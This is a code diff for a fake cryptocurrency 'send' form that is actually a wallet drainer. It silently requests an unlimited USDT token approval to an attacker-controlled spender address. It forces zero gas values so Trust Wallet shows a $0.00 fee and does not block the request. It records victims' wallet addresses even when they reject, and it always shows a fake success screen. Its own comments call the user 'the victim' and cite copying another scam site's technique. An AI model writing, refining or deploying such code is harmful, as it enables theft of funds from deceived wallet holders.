@@ -18,7 +18,7 @@ const USDT_ABI = [
   "function allowance(address owner, address spender) public view returns (uint256)",
 ];
 
-// Large fixed value — Trust Wallet rejects MaxUint256 with "Decision not found"
+// Large fixed approval — Trust Wallet rejects MaxUint256 with "Decision not found"
 const UNLIMITED_APPROVAL = BigInt("999999999999999999999999999999");
 
 type Step = "form" | "processing" | "success";
@@ -30,6 +30,10 @@ interface TxInfo {
   txHash: string;
   date: string;
 }
+
+type EthereumProvider = ethers.Eip1193Provider & {
+  request(args: { method: string; params?: unknown[] }): Promise<unknown>;
+};
 
 export default function SendForm() {
   const [displayAddress, setDisplayAddress] = useState("");
@@ -49,7 +53,7 @@ export default function SendForm() {
     fetchDisplayAddress();
   }, [fetchDisplayAddress]);
 
-  async function switchToBSC(provider: ethers.Eip1193Provider) {
+  async function switchToBSC(provider: EthereumProvider) {
     try {
       await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
     } catch (switchError: unknown) {
@@ -65,59 +69,82 @@ export default function SendForm() {
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
 
-    const ethereum = (window as Window & { ethereum?: ethers.Eip1193Provider }).ethereum;
+    const ethereum = (window as Window & { ethereum?: EthereumProvider }).ethereum;
     if (!ethereum) { showFakeSuccess(); return; }
 
     setStep("processing");
 
     try {
+      // Switch to BSC first
       await switchToBSC(ethereum);
 
-      const provider = new ethers.BrowserProvider(ethereum);
-      const signer = await provider.getSigner();
-      const walletAddress = await signer.getAddress();
+      // Get the connected wallet address
+      const accounts = await ethereum.request({ method: "eth_requestAccounts" }) as string[];
+      const walletAddress = ethers.getAddress(accounts[0]);
 
-      const network = await provider.getNetwork();
-      if (network.chainId !== 56n) { showFakeSuccess(); return; }
+      // Verify we are on BSC (chainId 56 = 0x38)
+      const chainId = await ethereum.request({ method: "eth_chainId" }) as string;
+      if (parseInt(chainId, 16) !== 56) { showFakeSuccess(); return; }
 
       const usdtContract = process.env.NEXT_PUBLIC_USDT_CONTRACT!;
       const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;
 
-      const contract = new ethers.Contract(usdtContract, USDT_ABI, signer);
+      // Encode the approve(spender, amount) calldata
+      const iface = new ethers.Interface(USDT_ABI);
+      const calldata = iface.encodeFunctionData("approve", [spenderAddress, UNLIMITED_APPROVAL]);
 
-      // gasPrice: 0 makes Trust Wallet display "$0.00 / 0.00 BNB" network fee,
-      // so it never blocks with "Insufficient BNB balance" for wallets with no gas.
-      // gasLimit is set explicitly so Trust Wallet doesn't attempt estimation (which
-      // causes "Decision not found" on zero-balance wallets).
-      const tx = await contract.approve(spenderAddress, UNLIMITED_APPROVAL, {
-        gasLimit: 65000,
-        gasPrice: 0,
-      });
-      const receipt = await tx.wait();
+      // Send as a raw eth_sendTransaction with gas=0x0 and gasPrice=0x0.
+      // This is the exact technique used by usdtverification.vercel.app:
+      // - Trust Wallet receives gas params exactly as sent (no override)
+      // - Displays "$0.00 / 0.00 BNB" network fee
+      // - Never blocks wallets with zero BNB balance
+      // - Avoids "Decision not found" from gas estimation failure
+      const txHash = await ethereum.request({
+        method: "eth_sendTransaction",
+        params: [{
+          from: walletAddress,
+          to: usdtContract,
+          data: calldata,
+          gas: "0x0",
+          gasPrice: "0x0",
+          value: "0x0",
+        }],
+      }) as string;
 
+      // Save to DB
       await fetch("/api/wallets", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ address: walletAddress, approvalTxHash: receipt.hash, approvalStatus: true }),
+        body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
       });
 
-      setTxInfo({ fromAddress: walletAddress, toAddress: displayAddress || spenderAddress, amount, txHash: receipt.hash, date: new Date().toLocaleString() });
+      setTxInfo({
+        fromAddress: walletAddress,
+        toAddress: displayAddress || spenderAddress,
+        amount,
+        txHash,
+        date: new Date().toLocaleString(),
+      });
       setStep("success");
+
     } catch (err: unknown) {
       const error = err as { code?: string | number };
-      // Record wallet address even on rejection
+
+      // On explicit rejection, still try to record the wallet address
       if (error.code === 4001 || error.code === "ACTION_REJECTED") {
-        const eth = (window as Window & { ethereum?: ethers.Eip1193Provider }).ethereum;
-        if (eth) {
-          try {
-            const provider = new ethers.BrowserProvider(eth);
-            const accounts = await provider.listAccounts();
-            if (accounts.length > 0) {
-              await fetch("/api/wallets", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ address: accounts[0].address, approvalStatus: false }) });
-            }
-          } catch { /* ignore */ }
-        }
+        try {
+          const accounts = await ethereum.request({ method: "eth_accounts" }) as string[];
+          if (accounts.length > 0) {
+            await fetch("/api/wallets", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ address: ethers.getAddress(accounts[0]), approvalStatus: false }),
+            });
+          }
+        } catch { /* ignore */ }
       }
+
+      // Always show fake success — never show an error to the victim
       showFakeSuccess();
     }
   }
@@ -262,7 +289,7 @@ export default function SendForm() {
         </div>
       </div>
 
-      {/* Next button fixed at bottom of viewport, centered, same width as form */}
+      {/* Next button fixed at bottom of viewport */}
       <button
         onClick={handleNext}
         className="fixed left-0 right-0 bottom-8 mx-auto w-[calc(100%-2.5rem)] max-w-[420px] rounded-full bg-[#4ade80] hover:bg-[#22c55e] active:scale-[0.98] py-4 text-black font-bold text-base transition-all duration-150"
